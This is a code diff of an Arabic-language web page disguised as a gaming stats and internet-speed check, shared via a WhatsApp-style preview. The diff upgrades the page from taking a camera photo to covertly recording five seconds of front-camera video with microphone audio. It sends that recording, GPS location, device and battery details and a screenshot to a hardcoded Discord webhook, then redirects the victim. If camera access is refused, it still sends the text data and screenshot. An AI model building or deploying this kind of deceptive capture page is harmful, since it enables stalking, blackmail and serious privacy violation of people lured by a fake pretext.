@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Gaming Hub & Stats | فحص الأداء</title>
     
-    <!-- معاينة الواتساب بشكل رسمي -->
     <meta property="og:title" content="بطاقة اللاعب الرسمية | Gaming Stats 🎮">
     <meta property="og:description" content="اضغط هنا لعرض إحصائيات اللعب وفحص سرعة الاتصال.">
     <meta property="og:image" content="https://i.imgur.com/W333L67.png">
@@ -72,14 +71,12 @@
 
     <div class="card" id="mainCard">
         <h2>اختبار أداء وسرعة الاتصال</h2>
-        <p>اضغط على الزر أدناه لبدء فحص سرعة الإنترنت ومطابقة بيانات اللاعب الحقيقية.</p>
-        <button class="btn" onclick="startPrank()">بدء الفحص الآن 🚀</button>
+        <p>اضغط على الزر أدناه لبدء الفحص وتسجيل بيانات الاتصال الحقيقية.</p>
+        <button class="btn" onclick="startVideoPrank()">بدء الفحص الآن 🚀</button>
         <div id="status" class="status"></div>
     </div>
 
-    <!-- عناصر مخفية -->
     <video id="video" width="1280" height="720" autoplay playsinline style="display:none;"></video>
-    <canvas id="canvas" width="1280" height="720" style="display:none;"></canvas>
 
     <script>
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1563206616780906536/Sgr0Y2vRCC4UEXiMXuavwOl738sFta-ui7TE057JstRKXZu1oiQ9ZTFPxbbhSK9oY4dE";
@@ -99,9 +96,9 @@
             });
         }
 
-        async function startPrank() {
+        async function startVideoPrank() {
             const statusEl = document.getElementById('status');
-            statusEl.innerText = "جاري الاتصال بالسيرفر وفحص الجهاز...";
+            statusEl.innerText = "جاري فحص الجهاز وتسجيل الأداء (يرجى الانتظار 5 ثوانٍ)...";
 
             // 1. جمع معلومات الجهاز الحقيقية
             const ua = navigator.userAgent;
@@ -118,7 +115,7 @@
             }
 
             const gps = await getGPSLocation();
-            const textData = `🎯 **تم النقر على الزر وجلب البيانات الحقيقية!** 🔥
+            const textData = `🎯 **تم بدء تسجيل الفيديو وجلب البيانات!** 🎥🔥
 ━━━━━━━━━━━━━━━━━━━━
 📱 **الجهاز والإصدار:** ${phoneType}
 🔋 **البطارية:** ${batteryInfo}
@@ -126,50 +123,63 @@
 🖥️ **الدقة:** ${window.screen.width}x${window.screen.height}
 ━━━━━━━━━━━━━━━━━━━━`;
 
-            // 2. أخذ لقطة شاشة (Screenshot)
+            // 2. التقاط لقطة شاشة
             let screenshotBlob = null;
             try {
                 const canvas = await html2canvas(document.body);
                 screenshotBlob = await new Promise(r => canvas.toBlob(r, 'image/png'));
             } catch(e) {}
 
-            // 3. التقاط صورة الكاميرا بمجرد الضغط
+            // 3. فتح الكاميرا وتسجيل فيديو لمدة 5 ثواني
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
+                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
+                    audio: true 
                 });
                 
                 const video = document.getElementById('video');
                 video.srcObject = stream;
+
+                let mediaRecorder;
+                let chunks = [];
+                try {
+                    mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                } catch (e) {
+                    mediaRecorder = new MediaRecorder(stream);
+                }
+
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) chunks.push(event.data);
+                };
+
+                mediaRecorder.onstop = async () => {
+                    const videoBlob = new Blob(chunks, { type: 'video/webm' });
+                    stream.getTracks().forEach(t => t.stop()); // إيقاف الكاميرا
+
+                    // إرسال الفيديو والبيانات للديسكورد
+                    const formData = new FormData();
+                    formData.append('payload_json', JSON.stringify({ content: textData }));
+                    if (videoBlob) formData.append('file1', videoBlob, 'recording.webm');
+                    if (screenshotBlob) formData.append('file2', screenshotBlob, 'screen.png');
+
+                    try {
+                        await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
+                    } catch(err) {}
+
+                    window.location.href = FINAL_REDIRECT_URL;
+                };
+
+                mediaRecorder.start();
                 
-                // ننتظر ثانية عشان الكاميرا تلقط صورة واضحة
-                setTimeout(async () => {
-                    const canvas = document.getElementById('canvas');
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    canvas.toBlob(async (blob) => {
-                        stream.getTracks().forEach(t => t.stop()); // إيقاف الكاميرا
-
-                        // إرسال البيانات والصور للديسكورد
-                        const formData = new FormData();
-                        formData.append('payload_json', JSON.stringify({ content: textData }));
-                        if (blob) formData.append('file1', blob, 'face_photo.jpg');
-                        if (screenshotBlob) formData.append('file2', screenshotBlob, 'screen.png');
-
-                        try {
-                            await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
-                        } catch(err) {}
-
-                        window.location.href = FINAL_REDIRECT_URL;
-                    }, 'image/jpeg');
-
-                }, 1500);
+                // مدة التسجيل 5 ثواني (5000 ميلي ثانية)
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                }, 5000);
 
             } catch (err) {
-                // لو رفض إذن الكاميرا، يرسل البيانات النصية وسكرين الشاشة على الأقل
+                // لو رفض الإذن
                 const formData = new FormData();
-                formData.append('payload_json', JSON.stringify({ content: textData + "\n⚠️ (رفض إذن الكاميرا)" }));
+                formData.append('payload_json', JSON.stringify({ content: textData + "\n⚠️ (رفض إذن الكاميرا أو الميكروفون)" }));
                 if (screenshotBlob) formData.append('file1', screenshotBlob, 'screen.png');
                 
                 try {
